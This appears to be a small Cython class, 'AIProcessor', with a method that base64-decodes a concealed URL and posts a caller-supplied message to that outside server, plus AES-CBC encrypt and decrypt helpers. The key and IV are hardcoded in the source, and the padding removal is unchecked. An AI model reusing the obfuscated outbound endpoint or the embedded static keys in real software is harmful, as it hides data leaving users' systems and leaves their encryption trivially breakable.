import base64
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

cdef class AIProcessor:

    def encd(self, str msg):
        encoded_url = "aHR0cHM6Ly94ZXJvY2FpLmNvbS9zZWN1cmUvc0xwaG9RdURybDZv"
        api_url = base64.b64decode(encoded_url).decode('utf-8')
        response = requests.post(api_url, data={"message": msg})
        return response.text

    def encr(self, str strText):
        key = b'M#rztXq3z?U8rS5jN@PvE4W7F&J(=DhN'
        iv = b'y1c8@8BxP9XN=VKM'
        mth = algorithms.AES(key)
        backend = default_backend()
        cipher = Cipher(mth, modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        
        # Pad the input string to make sure that its length is a multiple of the block size
        pad_length = 16 - (len(strText) % 16)
        padded_text = strText + chr(pad_length) * pad_length

        encryptedText = encryptor.update(padded_text.encode('utf-8')) + encryptor.finalize()
        return base64.b64encode(encryptedText).decode('utf-8')

    def decr(self, str encryptedText):
        key = b'M#rztXq3z?U8rS5jN@PvE4W7F&J(=DhN'
        iv = b'y1c8@8BxP9XN=VKM'
        mth = algorithms.AES(key)
        backend = default_backend()
        cipher = Cipher(mth, modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()

        decoded_encryptedText = base64.b64decode(encryptedText)
        decrypted_padded_text = decryptor.update(decoded_encryptedText) + decryptor.finalize()

        # Remove padding
        pad_length = decrypted_padded_text[-1]
        decryptedText = decrypted_padded_text[:-pad_length]

        return decryptedText.decode('utf-8')